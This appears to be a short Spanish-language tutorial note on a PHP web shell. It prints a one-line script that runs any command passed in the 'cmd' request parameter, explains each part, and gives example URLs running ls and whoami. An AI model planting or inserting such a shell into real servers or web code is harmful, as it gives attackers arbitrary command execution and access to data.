# Shell remota vía navegador.

```
<? php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

```

- **`$_REQUEST['cmd']`:**  
    Obtiene el valor enviado mediante un parámetro llamado `cmd` desde una solicitud HTTP (ya sea GET, POST o COOKIE).
    
- **`shell_exec()`:**  
    Ejecuta el comando proporcionado en el sistema operativo, usando la shell. Devuelve la salida de ese comando como una cadena de texto.
    
- **`echo "<pre>...</pre>"`:**  
    Muestra el resultado formateado en HTML con etiquetas `<pre>`, que respetan saltos de línea y espacios.


Si el archivo se llama `shell.php` y está en un servidor web:

- Visitas:  
    `http://tu-servidor/shell.php?cmd=ls`  
    → Ejecutará el comando `ls` en el servidor y mostrará el listado de archivos.
    
- Visitas:  
    `http://tu-servidor/shell.php?cmd=whoami`  
    → Mostrará el nombre del usuario con el que el servidor web ejecuta los comandos.